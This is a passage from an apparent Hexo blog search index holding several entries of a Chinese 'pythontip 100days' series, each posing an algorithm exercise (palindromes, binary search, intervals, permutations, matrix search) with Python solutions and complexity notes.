水平翻转</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> matrix<span class="token punctuation">[</span>n <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span>n <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>    <span class="token comment"># 主对角线翻转</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>            matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> matrix<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>    <span class="token keyword">return</span> matrix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n^2)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>翻转两次</li></ol><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rotateMatrix</span><span class="token punctuation">(</span>matrix<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span>    newmatric <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>newmatric<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            newmatric<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> newmatric<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day27</title>
      <link href="//code/python/pythontip-100days-day27/"/>
      <url>//code/python/pythontip-100days-day27/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个字符串 <code>s</code>，找到 <code>s</code> 中最长的回文子串的长度。回文串是指从左读和从右读都一样的字符串，例如<code>abcba</code>,<code>abccba</code></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">longestPalindrome('babad') -&gt; 3longestPalindrome('cbbd') -&gt; 2longestPalindrome('a') -&gt; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的参数不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>动态规划</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">longestPalindrome</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span> <span class="token operator">*</span> n <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>    ans <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment"># 枚举子串的长度 l+1</span>    <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 枚举子串的起始位置 i，这样可以通过 j=i+l 得到子串的结束位置</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            j <span class="token operator">=</span> i <span class="token operator">+</span> l            <span class="token keyword">if</span> j <span class="token operator">&gt;=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> l <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">elif</span> l <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token keyword">and</span> l <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&gt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>                ans <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n^2)</code></li><li>空间复杂度<code>O(n^2)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>动态规划</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day26</title>
      <link href="//code/python/pythontip-100days-day26/"/>
      <url>//code/python/pythontip-100days-day26/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>你可以假设数组中无重复元素。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">searchInsert([1,3,5,6], 5) -&gt; 2searchInsert([1,3,5,6], 2) -&gt; 1searchInsert([1,3,5,6], 7) -&gt; 4searchInsert([1,3,5,6], 0) -&gt; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的参数均不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>二分查找</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">searchInsert</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>    left <span class="token operator">=</span> <span class="token number">0</span>    right <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span>    ans <span class="token operator">=</span> n    <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">if</span> target <span class="token operator">&lt;=</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">:</span>            ans <span class="token operator">=</span> mid            right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> ans   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(nlogn)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>二分查找</li></ol><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">searchInsert</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> j<span class="token punctuation">:</span>        m <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">if</span> target <span class="token operator">==</span> nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> m        <span class="token keyword">elif</span> target <span class="token operator">&gt;</span> nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">:</span>            i <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">if</span> target <span class="token operator">&gt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> j <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> target <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> i            j <span class="token operator">=</span> m <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">return</span> m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day25</title>
      <link href="//code/python/pythontip-100days-day25/"/>
      <url>//code/python/pythontip-100days-day25/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给出一个<strong>无重叠的</strong> ，按照区间<strong>起始端点排序</strong>的区间列表。</p><p>在列表中插入一个新的区间，你需要确保列表中的区间仍然有序且不重叠（如果有必要的话，可以合并区间）</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">insertInterval([[1,3],[6,9]],[2,5]) -&gt;[[1,5],[6,9]]insertInterval([[1,2],[3,5],[6,7],[8,10],[12,16]],[4,8]) -&gt; [[1,2],[3,10],[12,16]]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的参数均不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>找到插入位置</li><li>合并区间</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">insertInterval</span><span class="token punctuation">(</span>intervals<span class="token punctuation">,</span>newInterval<span class="token punctuation">)</span><span class="token punctuation">:</span>    left<span class="token punctuation">,</span> right <span class="token operator">=</span> newInterval    placed <span class="token operator">=</span> <span class="token boolean">False</span>    ans <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> li<span class="token punctuation">,</span> ri <span class="token keyword">in</span> intervals<span class="token punctuation">:</span>        <span class="token keyword">if</span> li <span class="token operator">&gt;</span> right<span class="token punctuation">:</span>            <span class="token comment"># 在插入区间的右侧且无交集</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> placed<span class="token punctuation">:</span>                ans<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>left<span class="token punctuation">,</span> right<span class="token punctuation">]</span><span class="token punctuation">)</span>                placed <span class="token operator">=</span> <span class="token boolean">True</span>            ans<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>li<span class="token punctuation">,</span> ri<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> ri <span class="token operator">&lt;</span> left<span class="token punctuation">:</span>            <span class="token comment"># 在插入区间的左侧且无交集</span>            ans<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>li<span class="token punctuation">,</span> ri<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># 与插入区间有交集，计算它们的并集</span>            left <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> li<span class="token punctuation">)</span>            right <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>right<span class="token punctuation">,</span> ri<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> placed<span class="token punctuation">:</span>        ans<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>left<span class="token punctuation">,</span> right<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ans <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>找到插入位置</li><li>合并区间</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day24</title>
      <link href="//code/python/pythontip-100days-day24/"/>
      <url>//code/python/pythontip-100days-day24/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个没有<strong>重复</strong>数字的序列，返回其所有可能的全排列。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">permute([1,2,3]) -&gt; [  [1,2,3],  [1,3,2],  [2,1,3],  [2,3,1],  [3,1,2],  [3,2,1]]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的数组不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>回溯算法</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">permute</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">backtrack</span><span class="token punctuation">(</span>first <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 所有数都填完了</span>        <span class="token keyword">if</span> first <span class="token operator">==</span> n<span class="token punctuation">:</span>              res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 动态维护数组</span>            nums<span class="token punctuation">[</span>first<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>first<span class="token punctuation">]</span>            <span class="token comment"># 继续递归填下一个数</span>            backtrack<span class="token punctuation">(</span>first <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token comment"># 撤销操作</span>            nums<span class="token punctuation">[</span>first<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>first<span class="token punctuation">]</span>        n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    backtrack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n!)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>回溯算法</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day23</title>
      <link href="//code/python/pythontip-100days-day23/"/>
      <url>//code/python/pythontip-100days-day23/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给出一个区间的集合，请合并所有重叠的区间。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">mergeInterval([[1,3],[8,10],[15,18],[2,6]]) -&gt; [[1,6],[8,10],[15,18]]mergeInterval([[4,5],[1,4]]) -&gt; [[1,5]]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的二维数组不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>先对区间进行排序</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">mergeInterval</span><span class="token punctuation">(</span>intervals<span class="token punctuation">)</span><span class="token punctuation">:</span>    intervals<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    merged <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> interval <span class="token keyword">in</span> intervals<span class="token punctuation">:</span>        <span class="token comment"># 如果列表为空，或者当前区间与上一区间不重合，直接添加</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> merged <span class="token keyword">or</span> merged<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> interval<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            merged<span class="token punctuation">.</span>append<span class="token punctuation">(</span>interval<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># 否则的话，我们就可以与上一区间进行合并</span>            merged<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>merged<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> interval<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> merged<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(nlogn)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>先对区间进行排序</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day22</title>
      <link href="//code/python/pythontip-100days-day22/"/>
      <url>//code/python/pythontip-100days-day22/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在一个m*n的二维数组<code>matrix</code>中判断目标值<code>target</code>是否存在,该二维数组具有以下性质:</p><ol><li>每行中的整数从左到右按升序排列。</li><li>每行的第一个整数大于前一行的最后一个整数。</li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">searchMatrix([[1,3,5,7],[10,11,16,20],[23,30,34,60]],3) -&gt; TruesearchMatrix([[1,3,5,7],[10,11,16,20],[23,30,34,60]],13) -&gt; False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的二维数组不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>二分查找</li><li>一位坐标映射二维坐标</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">searchMatrix</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    left <span class="token punctuation">,</span> right <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> m <span class="token operator">*</span> n <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>        pivot_idx <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        pivot_element <span class="token operator">=</span> matrix<span class="token punctuation">[</span>pivot_idx <span class="token operator">//</span> n<span class="token punctuation">]</span><span class="token punctuation">[</span>pivot_idx <span class="token operator">%</span> n<span class="token punctuation">]</span>        <span class="token keyword">if</span> target <span class="token operator">==</span> pivot_element<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> target <span class="token operator">&lt;</span> pivot_element<span class="token punctuation">:</span>                right <span class="token operator">=</span> pivot_idx <span class="token operator">-</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                left <span class="token operator">=</span> pivot_idx <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(logmn)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>二分查找</li><li>一位坐标映射二维坐标</li></ol><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">searchMatrix</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    1. 找到tatget所在的列表    2. 使用二分法判断    :param matrix:    :param 